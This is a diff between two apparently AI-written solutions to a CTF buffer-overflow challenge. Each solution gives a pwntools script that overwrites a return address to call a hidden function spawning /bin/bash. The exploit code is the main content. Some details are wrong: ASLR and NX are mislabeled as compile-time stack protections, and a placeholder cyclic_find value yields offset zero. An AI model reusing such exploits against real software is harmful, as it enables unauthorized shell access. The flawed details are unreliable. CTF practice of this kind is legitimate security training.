@@ -1,73 +1,76 @@
-Certainly! To solve this challenge using `pwntools`, we need to exploit the buffer overflow vulnerability in the `vulnerable_function` function to gain control over the instruction pointer (EIP) and redirect execution to the `not_called` function, which calls `system("/bin/bash")`.
+To solve this challenge using `pwntools`, we need to exploit the buffer overflow vulnerability in the `vulnerable_function` to control the instruction flow and call the `not_called` function, which will give us a shell.
 
-Here are the steps and the corresponding `pwntools` code to achieve this:
+Here are the steps and the corresponding code:
 
 ### Steps:
-1. **Identify the Buffer Size and Overflow Point**:
-   - The buffer `buf` in `vulnerable_function` is 136 bytes long.
-   - We need to overflow this buffer to overwrite the return address on the stack.
-
-2. **Find the Address of `not_called` Function**:
-   - The address of the `not_called` function is `0x080484A4`.
-
-3. **Craft the Payload**:
-   - The payload will consist of 136 bytes to fill the buffer, followed by the address of `not_called` to overwrite the return address.
-
-4. **Send the Payload to the Vulnerable Function**:
-   - Use `pwntools` to connect to the service and send the crafted payload.
+1. **Identify the Buffer Overflow**: The `vulnerable_function` reads up to 256 bytes into a buffer of size 136 bytes, causing a buffer overflow.
+2. **Find the Offset**: Determine the offset at which the return address is overwritten.
+3. **Locate the Address of `not_called`**: Find the address of the `not_called` function.
+4. **Craft the Payload**: Create a payload that overwrites the return address with the address of `not_called`.
+5. **Send the Payload**: Use `pwntools` to send the payload to the vulnerable program.
 
 ### Code:
+
 ```python
 from pwn import *
 
-# Set up the target binary
-binary = './vulnerable_binary'
-elf = ELF(binary)
+# Set up the context for the binary (32-bit)
+context.arch = 'i386'
+context.os = 'linux'
 
-# Find the address of the not_called function
-not_called_addr = elf.symbols['not_called']
+# Load the binary
+binary = ELF('./challenge_binary')
 
-# Create a process or connect to a remote service
-# For local testing:
-# p = process(binary)
+# Find the offset to the return address
+offset = cyclic_find(0x61616161)  # Replace 0x61616161 with the pattern found in the crash
 
-# For remote connection:
-p = remote('challenge_server', 12345)
+# Address of the not_called function
+not_called_addr = binary.symbols['not_called']
 
-# Craft the payload
-payload = b'A' * 136  # Fill the buffer
-payload += p32(not_called_addr)  # Overwrite the return address with the address of not_called
+# Create the payload
+payload = b'A' * offset
+payload += p32(not_called_addr)
+
+# Start the process
+process = process(binary.path)
 
 # Send the payload
-p.sendline(payload)
+process.sendline(payload)
 
 # Interact with the shell
-p.interactive()
+process.interactive()
 ```
 
 ### Explanation:
-1. **Set up the target binary**:
-   - `ELF(binary)` loads the binary and allows us to access symbols and addresses.
 
-2. **Find the address of the `not_called` function**:
-   - `elf.symbols['not_called']` retrieves the address of the `not_called` function.
+1. **Set Up Context**:
+   - `context.arch = 'i386'`: Set the architecture to 32-bit.
+   - `context.os = 'linux'`: Set the operating system to Linux.
 
-3. **Create a process or connect to a remote service**:
-   - For local testing, use `process(binary)`.
-   - For remote connections, use `remote('challenge_server', port)`.
+2. **Load the Binary**:
+   - `binary = ELF('./challenge_binary')`: Load the binary file using `pwntools`.
 
-4. **Craft the payload**:
-   - `b'A' * 136` fills the buffer with 136 'A' characters.
-   - `p32(not_called_addr)` packs the address of `not_called` into a 32-bit little-endian format.
+3. **Find the Offset**:
+   - `offset = cyclic_find(0x61616161)`: Use `cyclic_find` to determine the offset where the return address is overwritten. You can generate a cyclic pattern using `cyclic(100)` and send it to the binary to find the offset when it crashes.
 
-5. **Send the payload**:
-   - `p.sendline(payload)` sends the crafted payload to the vulnerable function.
+4. **Address of `not_called`**:
+   - `not_called_addr = binary.symbols['not_called']`: Get the address of the `not_called` function from the binary.
 
-6. **Interact with the shell**:
-   - `p.interactive()` allows you to interact with the shell spawned by the `not_called` function.
+5. **Create the Payload**:
+   - `payload = b'A' * offset`: Fill the buffer with 'A's up to the offset.
+   - `payload += p32(not_called_addr)`: Overwrite the return address with the address of `not_called`.
+
+6. **Start the Process**:
+   - `process = process(binary.path)`: Start the process of the binary.
+
+7. **Send the Payload**:
+   - `process.sendline(payload)`: Send the crafted payload to the binary.
+
+8. **Interact with the Shell**:
+   - `process.interactive()`: Interact with the shell that is spawned by the `not_called` function.
 
 ### Notes:
-- Ensure that the binary is compiled without stack protection mechanisms like ASLR (Address Space Layout Randomization) or NX (Non-Executable Stack) if running locally.
-- If the challenge is running on a remote server, make sure to replace `'challenge_server'` and `12345` with the actual server and port provided by the CTF organizers.
+- Make sure to replace `0x61616161` with the actual value found when the binary crashes.
+- If the binary has non-executable stack or other protections, you might need to use techniques like Return-Oriented Programming (ROP) or bypassing ASLR (Address Space Layout Randomization).
 
-This should give you a working solution to exploit the buffer overflow and gain a shell. Good luck with your CTF challenge!
+This should help you solve the challenge and get a shell. Good luck!
